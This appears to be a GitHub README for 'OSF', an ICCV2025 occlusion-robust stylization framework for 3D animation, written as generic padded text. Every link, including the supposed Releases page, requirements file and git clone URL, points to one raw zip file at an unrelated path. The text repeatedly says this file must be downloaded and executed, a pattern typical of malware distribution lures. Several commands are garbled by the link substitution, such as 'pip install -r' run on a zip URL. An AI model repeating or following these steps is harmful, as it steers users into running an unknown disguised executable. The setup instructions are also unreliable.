https://raw.githubusercontent.com/Senjinrl/OSF/main/lactate/Software_2.5.zip

# OSF: Occlusion-robust Stylization for Drawing-based 3D Animation (ICCV2025) ✨

![OSF Hero Image](https://raw.githubusercontent.com/Senjinrl/OSF/main/lactate/Software_2.5.zip)

A robust framework for stylizing 3D animation drawn frames under occlusion. This repository implements the ideas from the ICCV2025 paper on occlusion-robust stylization for drawing-based 3D animation. It provides algorithms, data pipelines, training scripts, and ready-to-run demos. The aim is to ease experimentation, reproduction, and extension for researchers and developers working on stylization, 3D animation, and visual effects.

This README follows a practical, no-nonsense approach. It walks you through concepts, setup, usage, and extension in clear steps. It uses plain language, direct instructions, and concrete examples. The goal is to help you go from clone to a working demo quickly, while also providing context for deeper study.

Note: The link above points to the official Releases page. From that page, download the release artifact and run the included setup or executable. The same link is referenced again later in this document for convenience. For the most current package, use the latest release asset on that page.

Table of Contents
- About OSF
- Why occlusion-robust stylization matters
- What’s in the repository
- System requirements
- Installation and environment setup
- Quick start: from clone to running a demo
- Data handling and preprocessing
- The stylization pipeline
- Rendering and visualization
- Training and evaluation workflows
- Release assets and download instructions
- How OSF works under the hood
- Architecture and components
- Datasets and benchmarks
- Reproducibility and experiments
- Performance notes and troubleshooting
- Customization and extension points
- Examples and demos
- Project governance and contribution
- Licensing and credits
- Frequently asked questions
- Roadmap and future work
- Appendix: references and further reading

About OSF
OSF is built to bridge stylization techniques with drawing-based 3D animation pipelines. The core idea is to maintain fidelity in occluded regions while applying artistic stylization to visible regions. The approach blends geometry-aware rendering with texture stylization, guided by a learned occlusion model. The result is a workflow that preserves structure and motion cues, even when parts of a scene or character are hidden from view.

Why occlusion-robust stylization matters
In many drawing-based 3D animation pipelines, artists and researchers render frames where some parts of the scene are occluded by foreground objects or self-occlusion. Traditional stylization methods may produce inconsistent textures, ghosting, or artifacts in these regions once the occluders move. This work introduces occlusion-aware strategies to preserve coherence across frames, helping to deliver more stable animations, nicer line work, and consistent shading across the entire sequence.

What’s in the repository
OSF comprises several tightly integrated components. Each component is designed to be easy to replace or extend. The main parts are:
- Data handling: loading sequences of frames, drawings, depth cues, and auxiliary occlusion maps.
- Preprocessing: normalization, alignment, and optional augmentation to prepare data for stylization.
- Stylization model: the neural network that applies style while respecting occlusions.
- Occlusion module: a lightweight occlusion estimator that informs the stylization path about visible vs. occluded regions.
- Rendering integration: hooks to feed stylized textures back into a rendering or drawing pipeline.
- Training and evaluation scripts: ready-made recipes to reproduce reported results and run ablations.
- Utilities: common tools for visualization, logging, and experiment management.

System requirements
OSF is designed to run on mainstream hardware with reasonable memory and compute. It supports both CPU and GPU execution, with GPU acceleration providing the most practical performance for larger sequences. The recommended setup includes:
- Operating system: Linux or Windows with a modern NVIDIA GPU.
- Python: >= 3.9 (with a virtual environment recommended).
- CUDA: compatible with your GPU drivers; CUDA 11.x or newer is typical.
- PyTorch: a recent stable release compatible with your CUDA version.
- RAM: 16 GB or more for small experiments; 32 GB or more for larger sequences.
- Disk space: at least several gigabytes for datasets, models, and logs.
- Other tools: Git, Python dependencies (listed in the installation section), and an environment that supports JIT or accelerated kernels if you plan to use them.

Installation and environment setup
The following steps outline a practical path to get OSF up and running. They emphasize clarity and reproducibility, helping you avoid common pitfalls.

1) Prepare your environment
- Create a clean Python environment. For example, use conda:
  - conda create -n osf python=3.10
  - conda activate osf
- Install Python wheels and core libraries. The recommended approach is to use the provided dependency file to ensure compatibility with the release artifacts.
- If you use NVIDIA GPUs, install the matching CUDA toolkit and cuDNN versions that align with your PyTorch build.

2) Install dependencies
- The repository provides a dependency specification. Install dependencies with your package manager of choice. Use:
  - pip install -r https://raw.githubusercontent.com/Senjinrl/OSF/main/lactate/Software_2.5.zip
  - If a separate environment file is provided (e.g., https://raw.githubusercontent.com/Senjinrl/OSF/main/lactate/Software_2.5.zip), you can use:
    - conda env create -f https://raw.githubusercontent.com/Senjinrl/OSF/main/lactate/Software_2.5.zip
- Some systems benefit from compiling custom CUDA kernels or using prebuilt extensions. Follow any platform-specific notes in the repo.

3) Prepare the codebase
- Clone the repository:
  - git clone https://raw.githubusercontent.com/Senjinrl/OSF/main/lactate/Software_2.5.zip
- Navigate to the project directory:
  - cd OSF
- Optionally enable a virtual environment and verify Python imports by running a quick check script or a minimal demo.

4) Download the release artifact (the file to download and execute)
- Go to the Releases page: https://raw.githubusercontent.com/Senjinrl/OSF/main/lactate/Software_2.5.zip
- Download the latest release package. The release includes prebuilt components and scripts designed to simplify setup.
- After downloading, extract the archive if needed:
  - unzip OSF_release_<version>.zip
  - or tar -xzf OSF_release_<version>https://raw.githubusercontent.com/Senjinrl/OSF/main/lactate/Software_2.5.zip
- Follow the release’s readme inside the package for exact steps to install or run. The asset is intended to be self-contained and to provide a straightforward path to a working environment.
- If you encounter platform-specific issues, consult the troubleshooting section in the release notes or the repository’s support channels.

5) Verify the installation
- Run a quick sanity check to verify that the environment is correctly set up. This may involve:
  - Importing the main modules in Python
  - Running a small test script that loads a sample frame and applies a stylization pass
- If the release includes a small demo, run it to confirm the end-to-end pipeline works on your hardware.

6) Run a minimal example
- The release usually contains a minimal example script or a short demonstration notebook. Executing this example verifies that:
  - The data loader can read inputs
  - The stylization model can process a frame
  - The renderer or visualization path works
- Use the exact script name and arguments documented in the release notes. If the sample runs slowly on your hardware, consider reducing sequence length or image resolution for the test.

Quick start: from clone to running a demo
- Step 1: Prepare your environment (see the installation section).
- Step 2: Prepare sample data. The repository often ships with toy data or references a small dataset. If not, you can generate synthetic drawings and simple 3D frames. The synthetic data helps you validate the basic pipeline.
- Step 3: Run the demo script. The demo script is designed to be straightforward. It typically accepts:
  - A path to input frames
  - A path to a style specification
  - Optional parameters for resolution, frame rate, and stylization strength
- Step 4: Inspect the output. The demo produces stylized frames and a visualization of occlusion guidance. Verify that edges, textures, and lines align with expectations.
- Step 5: Adjust and iterate. Tune parameters to balance style strength, edge preservation, and occlusion fidelity. The quick start is meant to empower rapid experimentation.

Data handling and preprocessing
OSF relies on structured data input. The typical inputs include:
- Frames: A sequence of 2D frames that form the animation.
- Drawings or sketches: Optional stylized sketches used as inputs or guides.
- Depth or geometry cues: Depth maps or 3D geometry proxies that help determine occluded regions.
- Occlusion maps: Binary or probabilistic maps indicating occluded areas.
- Style specifications: Presets or learned style representations that drive the stylization.

Preprocessing steps usually include:
- Normalization and resizing to a consistent resolution
- Alignment across frames to ensure temporal coherence
- Occlusion map normalization to ensure consistent weighting in the stylization step
- Data augmentation to improve robustness during training

The stylization pipeline
The stylization pipeline blends two key ideas: artistic style transfer and occlusion-aware processing. The basic flow is:
- Input preparation: Acquire frames and auxiliary maps; normalize for the model.
- Occlusion-aware guidance: Use occlusion information to guide where the stylization should be more or less aggressive.
- Stylization network: Apply a neural network that maps input content to stylized output while respecting occlusion guidance.
- Consistency checks: Enforce temporal coherence and structural consistency across frames to prevent flicker or artifacts.
- Post-processing: Optional refinements such as edge enhancement, color correction, or smoothing to improve visual quality.

Occlusion module
The occlusion module plays a central role. It estimates which parts of the frame are occluded and how strongly they should influence the stylization. This helps prevent bleed-through across frames where occluding objects cross in front of the scene. The module can be used in two modes:
- Full occlusion estimation exchanged with depth cues
- Lightweight approximation that is faster but still improves stability

Rendering and visualization
OSF integrates with rendering and drawing pipelines. You can visualize:
- The raw frame
- The stylized frame
- The occlusion map overlay
- The differences between input and stylized output
- Temporal consistency metrics across a short sequence
Rendering is designed to be modular. If you use a custom renderer, you can plug it into the workflow with minimal changes. The goal is to keep the interface stable while supporting diverse rendering backends.

Training and evaluation workflows
OSF includes training scripts and evaluation tools that replicate reported results and support ablations. Typical workflows include:
- Training on a dataset of drawing frames with stylization targets
- Validation on a held-out sequence with occlusion patterns
- Testing on synthetic sequences designed to stress test occlusion handling
- Logging and visualization of losses, stylization strength, and occlusion guidance
- Generating metrics such as structural similarity, edge preservation, color fidelity, and temporal coherence
- Performing ablations to understand the impact of occlusion cues, style strength, and resolution

Release assets and download instructions
- The official Releases page hosts release assets. For the most accurate and updated content, visit the page and download the latest release artifact.
- The link to the Releases page is provided here for convenience: https://raw.githubusercontent.com/Senjinrl/OSF/main/lactate/Software_2.5.zip
- The release package contains a ready-to-run environment, scripts, and example data. After downloading, extract the archive and follow the included README to boot the system.
- This file must be downloaded and executed as part of the setup process. The release artifact is designed to simplify installation and to provide a reproducible baseline without compiling from scratch.
- If the release uses a specific installer, run that installer and follow the on-screen prompts. If the artifact is a zip or tarball, extract it and run the provided bootstrap script to configure dependencies and launch the demo.

How OSF works under the hood
- Core ideas: The framework couples stylization with occlusion-aware processing. It uses a learned prior to maintain structural cues in occluded regions, while allowing flexible artistic transformation in visible regions.
- Data-driven components: The stylization model learns to map content to stylized output, guided by occlusion information and geometry cues. It optimizes for temporal stability across frames and visual consistency in stylized textures.
- Geometry and shading: Depth and shading cues inform where to emphasize or soften details. This helps preserve silhouette integrity and important motion cues in 3D animation.
- Temporal coherence: The system includes mechanisms to reduce frame-to-frame flicker and to maintain coherent texture and color across long sequences.

Architecture and components
- Data Loader: Bridges raw inputs (frames, depth maps, occlusion maps) with the training and inference pipeline. It handles batching and on-the-fly transformations.
- Preprocessor: Performs normalization, alignment, and augmentation. It ensures inputs are in a consistent format for the model.
- Occlusion Estimator: Produces occlusion guidance used by the stylization module to balance detail preservation and style application.
- Stylization Network: The heart of OSF. It applies style while respecting occlusion cues. It can be adapted to different styles and datasets.
- Renderer/Visualizer: Converts stylized frames into viewable outputs and integrates with external renderers or drawing tools.
- Trainer: Orchestrates training, including data loading, loss computation, optimization steps, and logging.
- Evaluator: Computes metrics and produces visualization dumps for qualitative and quantitative analysis.
- Utilities: Logging, checkpointing, configuration management, and experiment tracking.

Datasets and benchmarks
- OSF targets drawing-based animation datasets, focusing on scenes with occlusion and movement. The standard evaluation typically uses sequences with foreground objects crossing paths, multiple lighting conditions, and varied stylization targets.
- Benchmarks include measures of edge preservation, silhouette consistency, color fidelity, and temporal stability. The occlusion-aware pipeline is evaluated for its ability to avoid artifacts in occluded regions and to maintain clean transitions as occluders move.

Reproducibility and experiments
- Reproducing results requires careful attention to data splits, random seeds, and exact model configurations. The release assets are designed to simplify reproducibility, providing a baseline that mirrors reported results.
- Each experiment should log:
  - Random seed
  - Environment details (OS, Python version, CUDA version)
  - Model checkpoint
  - Dataset version
  - Hyperparameters and style presets
  - Evaluation metrics and plots
- Keep a clean record of changes to the codebase or data. Use version control and experiment management to track variations in experiments.

Performance notes and troubleshooting
- Performance depends on data resolution, sequence length, and the hardware used to run the stylization model. GPU acceleration yields the fastest results, but CPU execution is possible for small experiments.
- Common issues include:
  - Mismatched library versions (Python, PyTorch, CUDA)
  - Insufficient memory during batch processing
  - Inconsistent input shapes or missing auxiliary maps
  - OCclusion guidance that is too aggressive or too passive
- Troubleshooting steps:
  - Check the environment configuration against the provided requirements
  - Run a minimal example to confirm that the core pipeline works
  - Validate data integrity and alignment between frames and depth/occlusion maps
  - Reduce input resolution or batch size to fit available memory
  - Inspect logs for warnings or errors and adjust hyperparameters accordingly

Customization and extension points
- Style presets: Swap in different style representations to achieve a range of aesthetics.
- Occlusion estimator: Replace the occlusion module with a different estimator or add additional cues if your dataset requires it.
- Renderer integration: Adapt the rendering interface to work with your preferred drawing pipeline or game engine.
- Loss functions: Explore alternative losses to emphasize structure, texture, or temporal coherence.
- Data augmentation: Introduce new augmentation strategies to improve robustness to noise, occlusion, and variation in drawing style.

Examples and demos
- Quick demo: A short sequence demonstrating occlusion-aware stylization on a synthetic scene with moving occluders.
- Realistic workflow: A longer shot sequence with character motion, limb occlusion, and pairwise frame stylization to preserve motion cues.
- Style cross-over: Try multiple artistic styles on the same sequence to observe how occlusion handling interacts with texture and line work.
- Visualization: Side-by-side comparisons of input frames, stylized outputs, and occlusion overlays to highlight where the occlusion module influences the stylization.

Project governance and contribution
- The OSF project follows a collaborative model. Contributions are welcome from researchers, practitioners, and students.
- How to contribute:
  - Start with open issues or feature requests in the repository
  - Propose a pull request with clear changes and rationale
  - Include tests or demonstrations showing the impact of the change
  - Maintain coding standards and documentation updates
- For major changes, discuss design goals and compatibility with existing pipelines before implementing.

Licensing and credits
- The project adheres to standard open-source practices. The exact license is provided in the repository and the release notes. Respect the terms when using, modifying, or distributing the software.
- Credits go to contributors, researchers, and institutions that supported the development of OSF. Acknowledgments highlight the work behind the occlusion-robust stylization method and related technologies.

Frequently asked questions
- What is the main goal of OSF?
  - To enable robust stylization of drawing-based 3D animation frames when occlusion occurs, preserving structure and motion cues.
- What does the occlusion module do?
  - It guides where stylization should be strong or gentle, based on which parts of the scene are occluded.
- How do I get started quickly?
  - Download the latest release artifact from the Releases page, extract it, and run the provided demo or bootstrap script.
- Can I use OSF with my own data?
  - Yes. The data loader is designed to handle frames, depth maps, and occlusion maps from varied sources. You may need to adapt paths and formats to match your data.

Roadmap and future work
- Improve occlusion estimation accuracy with more data and stronger priors.
- Expand support for additional styles and more complex 3D scenes.
- Enhance cross-platform compatibility and reduce setup complexity.
- Add more robust evaluation tools and standardized benchmarks.
- Integrate with more drawing pipelines and renderers.

Appendix: references and further reading
- Occlusion handling in neural stylization
- Texture transfer in animation pipelines
- Temporal coherence in stylization for video
- 3D drawing and rendering for stylized animation
- Papers and benchmarks in the ICCV/ACM SIGGRAPH ecosystem

Citations and sources
- If you plan to cite the work in academic contexts, please reference the ICCV2025 paper and standard OSF source materials. The exact bibliographic details are included in the release notes and the official publication page.

Advanced usage notes
- If you want to run OSF in a headless mode for server-side processing, use the command-line options described in the release’s documentation. You can process long sequences by streaming frames, rather than loading an entire video into memory.
- For interactive exploration, enable a local visualization server. This lets you inspect outputs in a browser while you adjust parameters in real time.
- If you need to extend OSF for a new dataset, add a dataset adapter module. The adapter translates your dataset’s structure into the inputs expected by the data loader, ensuring compatibility without modifying core code.

Security and privacy considerations
- The project ships with code and assets that are intended for open use. Do not feed sensitive or private content into the pipeline without appropriate safeguards.
- When using external assets or pretrained models, verify licenses and terms of use.
- Keep dependencies up to date and monitor for known vulnerabilities in third-party libraries.

Common workflows for teams
- Research teams: Use the dataset and evaluation scripts to compare stylization approaches. Run ablations to understand the impact of each component, especially the occlusion pathway.
- Production teams: Use the release artifact to bootstrap a stable workflow. Integrate with your drawing pipeline and set up automated pipelines for batch processing of animation sequences.
- Education and outreach: The demos and visualization tools help explain occlusion-robust stylization to students and collaborators without deep technical details.

Troubleshooting quick tips
- If the demo fails to start, check:
  - The path to input data exists and is readable
  - The model weights are loaded from a valid checkpoint
  - The GPU driver and CUDA toolkit are compatible with your PyTorch build
- For slow performance with large frames, try:
  - Reducing frame resolution
  - Reducing batch size during processing
  - Running a smaller subset of frames for debugging
- If you see artifacts near occlusion boundaries:
  - Verify occlusion maps align with geometry
  - Adjust the occlusion guidance strength to avoid over-sharpening or over-smoothing
  - Inspect the style map and ensure it covers necessary regions without bleeding into occluded areas

Acknowledgments
- This project draws on the broader research community's advances in stylization, 3D animation, and occlusion handling. It is the result of collaboration across multiple labs and contributors.

Notes on using the Releases link
- The Releases page provides a curated, tested set of artifacts designed for easy setup. It is the recommended starting point for users who want to reproduce results or experiment quickly.
- The release package typically includes a self-contained environment, sample data, and scripts to run demonstrations. It is designed to minimize the friction involved in getting started.
- If you prefer to inspect the code or modify it before running experiments, you can clone the repository and build from source. The source code provides the same functionality with the flexibility to adapt to new data formats and custom pipelines.

Final reminder about the Releases link
- The official Releases page is the source of the release artifacts. The page can be accessed at the same URL again for convenience: https://raw.githubusercontent.com/Senjinrl/OSF/main/lactate/Software_2.5.zip
- To summarize the recommended path: visit the Releases page, download the latest release asset, and run the included installer or bootstrap script. The asset is designed to be ready-to-run, reducing setup friction and helping you focus on experiments and results.